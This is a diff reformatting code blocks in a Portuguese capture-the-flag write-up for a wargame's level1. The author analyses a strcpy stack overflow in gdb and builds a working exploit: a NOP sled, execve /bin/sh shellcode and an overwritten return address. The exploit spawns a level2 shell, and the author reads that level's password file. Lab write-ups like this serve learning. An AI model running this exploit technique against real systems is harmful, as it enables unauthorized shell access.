@@ -26,30 +26,36 @@ Procurei por mainno resulado do objdump. Não sou um ninja do asm, apenas me vi
 
 As primeiras linhas são essas:
 
-```804841c: 55 push %ebp
+```
+804841c: 55 push %ebp
 804841d: 89 e5 mov %esp,%ebp
 804841f: 83 e4 f0 and $0xfffffff0,%esp
-8048422: 81 ec 10 04 00 00 sub $0x410,%esp```
+8048422: 81 ec 10 04 00 00 sub $0x410,%esp
+```
 
 Acredito que sejam referentes a formação do stack frame da função (relaxa que, se não sabes o que é stack frame, o google te fala). Percebi também que a última linha cria espaço nesse frame, 1040 bytes (subtraindo 410 em hex do ponteiro esp). Saber do tamanho desse espaço será útil mais para frente.
 
 Tive mais dificuldade ao interpretar as linhas seguintes, que são essas:
 
-```8048428: 8b 45 0c mov 0xc(%ebp),%eax
+```
+8048428: 8b 45 0c mov 0xc(%ebp),%eax
 804842b: 83 c0 04 add $0x4,%eax
 804842e: 8b 00 mov (%eax),%eax
 8048430: 89 44 24 04 mov %eax,0x4(%esp)
 8048434: 8d 44 24 10 lea 0x10(%esp),%eax
 8048438: 89 04 24 mov %eax,(%esp)
-804843b: e8 c0 fe ff ff call 8048300 strcpy@plt```
+804843b: e8 c0 fe ff ff call 8048300 strcpy@plt
+```
 
 Mas, por suposição, acreditei que elas fossem responsáveis por receber o argumento e organizar as coisas para fazer uma chamada para strcpy. Essa função recebe dois argumentos: uma string de origem e outra de destino. Ela simplesmente copia a string de origem para o destino.
 
 As três últimas linhas de instruções são essas:
 
-```8048440: b8 00 00 00 00 mov $0x0,%eax
+```
+8048440: b8 00 00 00 00 mov $0x0,%eax
 8048445: c9 leave
-8048446: c3 ret```
+8048446: c3 ret
+```
 
 O que, acredito, representam apenas o return(0) e morte da nossa função (descubra no google sobre as instruções LEAVE e RET).
 
@@ -81,20 +87,24 @@ Lembra que no começo do writeup falei que acreditava que as primeiras linhas do
 
 Então, se o tamanho reservado seria de 1040 bytes (decimal de 410 em hex), mandar até 1035 B's faria o programa finalizar normalmente, já que o endereço de retorno ficaria salvo de ser corrompido. Você também pode fazer o teste:
 
-```(gdb) run $(python -c 'print B*1035')
+```
+(gdb) run $(python -c 'print B*1035')
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
 
 Starting program: /levels/level1 $(python -c 'print B*1035')
-[Inferior 1 (process 27709) exited normally]```
+[Inferior 1 (process 27709) exited normally]
+```
 
 Ok, aqui pode surgir uma dúvida. Eu mesmo tive que recorrer ao google. Se o endereço de retorno, o que vai cair em EIP, tem 4 bytes de tamanho, 4 B's, porque mandar como argumento 1036 B's, traz o seguinte resultado?
 
-```(gdb) run $(python -c 'print B*1036')
+```
+(gdb) run $(python -c 'print B*1036')
 Starting program: /levels/level1 $(python -c 'print B*1036')
 
 Program received signal SIGSEGV, Segmentation fault.
-0xb7ea1e00 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6```
+0xb7ea1e00 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
+```
 
 Simples. Toda string tem um null terminator (\0) no seu fim.
 
@@ -104,11 +114,13 @@ Então, sem precisar do create_pattern e similares, apenas com a analíse do pr
 
 Basta mandar 1036 B's + Endereço de retorno.
 
-```(gdb) run $(python -c 'print B*1036 + R*4')
+```
+(gdb) run $(python -c 'print B*1036 + R*4')
 Starting program: /levels/level1 $(python -c 'print B*1036 + R*4')
 
 Program received signal SIGSEGV, Segmentation fault.
-0x52525252 in ?? ()```
+0x52525252 in ?? ()
+```
 
 52 é o hex de R *
 
@@ -130,10 +142,12 @@ No gdb há o comando x de "examinar". Ele serve para, claro, examinar a memória
 Resolvo usar <em>x/100x $esp</em>. Isso irá mostrar, a partir de ESP, que é o cara que aponta para o topo do stack, o conteúdo de 100 endereços da memória em blocos de quatro.
 Como o resultado do comando <em>x/100x $esp</em> nos exibe muita coisa, menos os nossos B's, decido aumentar o número usando <em>x/200x $esp</em>.
 
-```0xbffff530: 0x00000000 0x00000000 0x03000000 0xdf96c26d
+```
+0xbffff530: 0x00000000 0x00000000 0x03000000 0xdf96c26d
 0xbffff540: 0x2100e899 0x2a303780 0x69cb98e8 0x00363836
 0xbffff550: 0x656c2f00 0x736c6576 0x76656c2f 0x00316c65
-0xbffff560: 0x42424242 0x42424242 0x42424242 0x42424242```
+0xbffff560: 0x42424242 0x42424242 0x42424242 0x42424242
+```
 
 E em meio a todos, encontro o primeiro B em 0xbffff560. Esse é o endereço do inicio da string que passamos como argumento para level1.
 
@@ -150,30 +164,40 @@ Certo. Já sabemos quantos bytes são necessários para corromper o endereço de
 
 O shellcode que escolhi fica com a tarefa de executar <em>/bin/sh</em>:
 
-```\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\xb0\x0b\xcd\x80```
+```
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\xb0\x0b\xcd\x80
+```
 
 O google é seu amigo. Caso queira entender que porra é essa aí em cima, não será difícil encontrar informações. Não seja um kiddie que só executa as coisas que um tutorial manda  :p
 
 Então o código em python que explora level1 evoluiu disso aqui:
 
-```python -c 'print B*1036 + R*4'```
+```
+python -c 'print B*1036 + R*4'
+```
 
 Para isso:
 
-```python -c 'print \x90*1015 + \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\xb0\x0b\xcd\x80 + \x30\xf8\xff\xbf'```
+```
+python -c 'print \x90*1015 + \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\xb0\x0b\xcd\x80 + \x30\xf8\xff\xbf'
+```
 
 As mudanças foram: substitui os B's por \x90, que formarão o NOP sled. Subtrai 21 dos 1036, pois 21 é o tamanho em bytes do meu shellcode que segue logo depois dos NOPs. E adicionei o endereço que quero que EIP aponte: 0xbffff830 que, por causa da little endian (google it), precisa ser inserido com os bytes em ordem invertida (bf ff f8 30 vira 30 f8 ff bf).
 
 Então é hora da verdade. Sai do gdb e executei a seguinte linha de comando:
 
-```./level1 $(python -c 'print \x90*1015 + \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\xb0\x0b\xcd\x80 + \x30\xf8\xff\xbf')```
+```
+./level1 $(python -c 'print \x90*1015 + \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\xb0\x0b\xcd\x80 + \x30\xf8\xff\xbf')
+```
 
 Instantaneamente, vi meu prompt mudar de level1@rzt-bin01 para um módico $.
 Foi só usar o comando <em>whoami</em> para ter certeza.
 
-```$ whoami
+```
+$ whoami
 level2
 $ cat /home/level2/.pass
-byBicmVubm9yZHMgZWggbyBtZWxob3I=```
+byBicmVubm9yZHMgZWggbyBtZWxob3I=
+```
 
 Pwned ;D
